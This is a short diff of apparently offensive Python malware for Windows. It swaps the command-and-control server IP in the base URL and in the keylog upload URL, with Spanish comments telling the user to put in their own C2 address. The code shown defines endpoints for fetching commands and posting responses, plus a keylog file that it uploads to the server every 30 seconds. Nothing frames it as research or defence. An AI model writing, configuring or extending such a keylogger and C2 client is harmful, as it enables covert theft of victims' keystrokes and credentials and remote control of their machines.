@@ -40,14 +40,14 @@ if not success:
 hostname = buffer.value
 
 
-BASE_URL = "http://54.235.53.178/"
+BASE_URL = "http://54.227.92.142/" # <----------- TU IP DE C2
 STATUS_ENDPOINT = f"{BASE_URL}/status"
 COMMANDER_ENDPOINT = f"{BASE_URL}/Comander"
 RESPONSES_ENDPOINT = f"{BASE_URL}/Responses"
 
 
 KEYLOG_PATH = r"C:\Users\Public\Downloads\keyloge.txt"
-KEYLOG_UPLOAD_URL = "http://54.235.53.178/uploads"
+KEYLOG_UPLOAD_URL = "http://54.227.92.142/uploads" # <----------- TU IP DE C2
 KEYLOG_INTERVAL_SECS = 30 
 
 try:
